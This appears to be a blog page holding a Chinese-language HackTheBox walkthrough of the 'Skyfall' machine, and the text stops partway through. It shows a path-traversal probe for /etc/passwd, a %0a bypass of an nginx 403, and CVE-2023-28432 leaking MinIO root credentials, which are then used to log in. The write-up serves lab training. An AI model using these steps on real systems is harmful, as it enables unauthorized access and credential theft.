@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Skyfall - Version 2由於這個機器剛出沒多久就被patch了，所以重新寫一下。 ​​ 0x1 nmap1234567891011121322&#x2F;tcp o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Skyfall - Patch">
+<meta property="og:url" content="https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Skyfall - Version 2由於這個機器剛出沒多久就被patch了，所以重新寫一下。 ​​ 0x1 nmap1234567891011121322&#x2F;tcp o">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240424065500-t0ngpws.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240205143122-aztum89.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240205143833-ep9j5fo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240424054520-t6uxr5u.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240424054936-nv7tkfq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240424062131-d5mf765.png">
+<meta property="article:published_time" content="2024-04-23T23:08:44.000Z">
+<meta property="article:modified_time" content="2024-09-02T18:20:30.311Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240424065500-t0ngpws.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Skyfall - Patch</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/04/29/2024-htb-machine/17-Intuition/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/04/21/2024-htb-machine/15-Runner/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&text=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&title=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&is_video=false&description=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Skyfall - Patch&body=Check out this article: https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&title=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&title=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&title=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&title=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&name=HackTheBox - Machine - Skyfall - Patch&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/04/24/2024-htb-machine/16-skyfall-patch/&t=HackTheBox - Machine - Skyfall - Patch"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Skyfall - Patch
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-23T23:08:44.000Z" class="dt-published" itemprop="datePublished">2024-04-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Skyfall-Version-2"><a href="#Skyfall-Version-2" class="headerlink" title="Skyfall - Version 2"></a>Skyfall - Version 2</h1><p>由於這個機器剛出沒多久就被patch了，所以重新寫一下。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240424065500-t0ngpws.png" alt="image">​</p>
+<h2 id="0x1-nmap"><a href="#0x1-nmap" class="headerlink" title="0x1 nmap"></a>0x1 nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCVqvI8vGs8EIUAAUiRze8kfKmYh9ETTUei3zRd1wWWLRBjSm+soBLfclIUP69cNtQOa961nyt2/BOwuR35cLR4=</span><br><span class="line">|   256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINk0VgEkDNZoIJwcG5LEVZDZkEeSRHLBmAOtd/pduzRW</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-title: Skyfall - Introducing Sky Storage!</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-WEB-80"><a href="#0x2-WEB-80" class="headerlink" title="0x2 WEB - 80"></a>0x2 WEB - 80</h2><p>打開80端口的網站，看到有個 <code>demo.skyfall.htb</code>​，</p>
+<p>來到：<code>http://demo.skyfall.htb/files</code>​，然後有個下載按鈕，點一下下載，下載鏈接如下：</p>
+<p>​<code>http://demo.skyfall.htb/download_file?filename=Welcome.pdf</code>​</p>
+<p>‍</p>
+<p>訪問：<code>http://demo.skyfall.htb/download_file?filename=../../../../../../etc/passwd</code>​ </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S3 operation failed; code: SignatureDoesNotMatch, message: The request signature we calculated does not match the signature you provided. Check your key and signing method., resource: /etc/passwd, request_id: 17B0E3A135462034, host_id: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855, bucket_name: etc, object_name: passwd </span><br></pre></td></tr></table></figure>
+
+<p>然後左邊有個 <code>MinIO Metrics</code>​ 感覺就像是開源的儲存對象</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240205143122-aztum89.png" alt="image">​</p>
+<p>訪問 <code>http://demo.skyfall.htb/metrics/</code>​ 顯示403，試一下會不會是nginx配置錯誤而導致的403，</p>
+<p>‍</p>
+<p>所以試下bypass，<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx#unsafe-variable-use-1">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx#unsafe-variable-use-1</a></p>
+<p>‍</p>
+<p>嘗試： <code>http://demo.skyfall.htb/metrics%20</code>​ 失敗</p>
+<p>嘗試： <code>http://demo.skyfall.htb/metrics%0d</code>​ 失敗</p>
+<p>嘗試： <code>http://demo.skyfall.htb/metrics%0a</code>​ 成功，打開了一個神奇的網頁</p>
+<p>拉到最底下看到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">minio_endpoint_url</span><br><span class="line">demo.skyfall.htb</span><br><span class="line">http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster</span><br></pre></td></tr></table></figure>
+
+<p>把他加進去hosts。</p>
+<h2 id="0x3-Web-80-minio-endpoint"><a href="#0x3-Web-80-minio-endpoint" class="headerlink" title="0x3 Web 80 - minio endpoint"></a>0x3 Web 80 - minio endpoint</h2><p>打開：<code>http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster</code>​ 看到一些感覺沒什麽用的東西，然後網上找下CVE</p>
+<blockquote>
+<ol>
+<li>The vulnerability exists in the API endpoint <strong><a target="_blank" rel="noopener" href="http://your-ip:9000/minio/bootstrap/v1/verify">http://your-ip:9000/minio/bootstrap/v1/verify</a></strong>. Use the POC mentioned above by sending the request to retrieve all environment variables.</li>
+<li>If the vulnerability is present, the response will include all environment variables, including <strong>MINIO_SECRET_KEY</strong> and <strong>MINIO_ROOT_PASSWORD</strong>.</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.pingsafe.com/blog/cve-2023-28432-minio-information-disclosure-vulnerability/">https://www.pingsafe.com/blog/cve-2023-28432-minio-information-disclosure-vulnerability/</a></p>
+</blockquote>
+<p>所以就嘗試一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-6CCcxT30YvXa9pUS-skyfallv2/image-20240205143833-ep9j5fo.png" alt="image">​</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;MinioEndpoints&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;Legacy&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;SetCount&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;DrivesPerSet&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;Endpoints&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;Scheme&quot;</span><span class="punctuation">:</span><span class="string">&quot;http&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Opaque&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span><span class="string">&quot;minio-node1:9000&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span><span class="string">&quot;/data1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;RawPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;OmitHost&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;ForceQuery&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;RawQuery&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fragment&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;RawFragment&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;IsLocal&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Scheme&quot;</span><span class="punctuation">:</span><span class="string">&quot;http&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Opaque&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span><span class="string">&quot;minio-node2:9000&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span><span class="string">&quot;/data1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;RawPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;OmitHost&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;ForceQuery&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;RawQuery&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fragment&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;RawFragment&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;IsLocal&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Scheme&quot;</span><span class="punctuation">:</span><span class="string">&quot;http&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Opaque&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span><span class="string">&quot;minio-node1:9000&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span><span class="string">&quot;/data2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;RawPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;OmitHost&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;ForceQuery&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;RawQuery&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fragment&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;RawFragment&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;IsLocal&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Scheme&quot;</span><span class="punctuation">:</span><span class="string">&quot;http&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Opaque&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span><span class="string">&quot;minio-node2:9000&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span><span class="string">&quot;/data2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;RawPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;OmitHost&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;ForceQuery&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;RawQuery&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Fragment&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;RawFragment&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;IsLocal&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;CmdLine&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://minio-node&#123;1...2&#125;/data&#123;1...2&#125;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Platform&quot;</span><span class="punctuation">:</span><span class="string">&quot;OS: linux | Arch: amd64&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;MinioEnv&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;MINIO_ACCESS_KEY_FILE&quot;</span><span class="punctuation">:</span><span class="string">&quot;access_key&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_BROWSER&quot;</span><span class="punctuation">:</span><span class="string">&quot;off&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_CONFIG_ENV_FILE&quot;</span><span class="punctuation">:</span><span class="string">&quot;config.env&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_KMS_SECRET_KEY_FILE&quot;</span><span class="punctuation">:</span><span class="string">&quot;kms_master_key&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_PROMETHEUS_AUTH_TYPE&quot;</span><span class="punctuation">:</span><span class="string">&quot;public&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_ROOT_PASSWORD&quot;</span><span class="punctuation">:</span><span class="string">&quot;GkpjkmiVmpFuL2d3oRx0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_ROOT_PASSWORD_FILE&quot;</span><span class="punctuation">:</span><span class="string">&quot;secret_key&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_ROOT_USER&quot;</span><span class="punctuation">:</span><span class="string">&quot;5GrE1B2YGGyZzNHZaIww&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_ROOT_USER_FILE&quot;</span><span class="punctuation">:</span><span class="string">&quot;access_key&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_SECRET_KEY_FILE&quot;</span><span class="punctuation">:</span><span class="string">&quot;secret_key&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_UPDATE&quot;</span><span class="punctuation">:</span><span class="string">&quot;off&quot;</span><span class="punctuation">,</span><span class="attr">&quot;MINIO_UPDATE_MINISIGN_PUBKEY&quot;</span><span class="punctuation">:</span><span class="string">&quot;RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到leak了一些比較重要的賬號密碼，所以嘗試連接上看看，下載 minio 的cli： <a target="_blank" rel="noopener" href="https://min.io/download#/linux">https://min.io/download#/linux</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.min.io/client/mc/release/linux-amd64/mc</span><br><span class="line"><span class="built_in">chmod</span> +x mc</span><br><span class="line">./mc <span class="built_in">alias</span> <span class="built_in">set</span> minio/ http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0</span><br></pre></td></tr></table></figure>
+
+<p>試一下：</p>
